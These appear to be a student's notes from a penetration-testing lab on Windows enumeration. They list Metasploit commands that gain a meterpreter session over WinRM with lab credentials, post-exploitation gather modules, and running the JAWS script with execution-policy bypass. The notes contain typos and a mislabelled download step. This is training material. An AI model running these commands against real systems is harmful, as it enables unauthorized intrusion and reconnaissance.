* There are multiple scripts which can be used to automate the enumeration process but we will use JAWS here

## JAWS (Just Another Windows (Enum) Script)
* It is a powershell script designed to help penetration testers (and CTFers) identify potential privilege escalation vectors on Windows systems
* It is written in Powershell 2.0, so should run on every version since Windows 7
* `https://github.com/411Hall/JAWS`


* PRACTICAL
* This target system has WinRM enabled so we will target the port number 5985
* `search winrm`
* `use exploit/windows/winrm/winrm_script_exec`
* `set suername administrator`
* `set password tinkerbell` --> Uname and Pword were provided with the lab
* `run` -> We should get a meterpreter session
* Now to automate, using this meterpreter session
* `show_mount --> To know aboue the disk space
* `background`
* Inside msfconsole:
* `use post/windows/gather/win_privs` OR
* `use post/windows/gather/enum_logged_on_users`
* `search checkvm`
* `use post/windows/gather/checkvm`
* List of installed applications
  * `search enum_applications`
  * `use post/windows/gather/enum_applications`
 
* Enumerate the systems connected to the target
  * `use post/windows/gather/enum_computers`
 
* `use post/windows/gather/enum_patches`

* List of SMB shares
  * `use post/ windows/gather/enum_shares`
 
* **JAWS**
  * Copy the powershell script from Github.
  * Click on `jaws-enum.ps1` Powershell script.
  * Copy it
  * Go back to the msfconsole
  * Open the clipboard --> Ctrl+Shift+Alt
  * Copy the script and make a new file named "jaws-enum.ps1"
  * Navigate to the file path
  * `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
 
  * Now go back to the Meterpreter session:
  * `download JAWS_Enum.txt` --> Downloaded on the target
  *
